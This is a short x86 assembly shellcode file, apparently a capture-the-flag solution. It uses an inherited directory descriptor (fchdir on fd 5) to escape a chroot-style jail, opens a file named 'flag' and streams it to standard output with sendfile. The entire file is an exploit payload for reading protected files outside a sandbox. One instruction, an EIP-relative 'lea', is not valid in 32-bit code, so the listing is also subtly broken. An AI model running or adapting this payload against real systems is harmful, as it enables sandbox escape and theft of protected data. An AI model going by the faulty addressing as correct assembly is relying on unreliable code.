.global _start
.intel_syntax noprefix
_start:
    # fchdir /
    mov eax, 133
    mov ebx, 5
    int 0x80
    

    # open(flag, 0)
    mov eax, 5
    lea ebx, [eip+flag]
    xor ecx, ecx
    int 0x80

    
    # sendfile(1, open(), 0, 1000)
    mov ebx, 1
    mov ecx, eax 
    mov edx, 0
    mov esi, 1000
    mov eax, 187
    int 0x80

    # exit()
    mov eax, 1
    int 0x80
    
flag:
    .string "flag"

    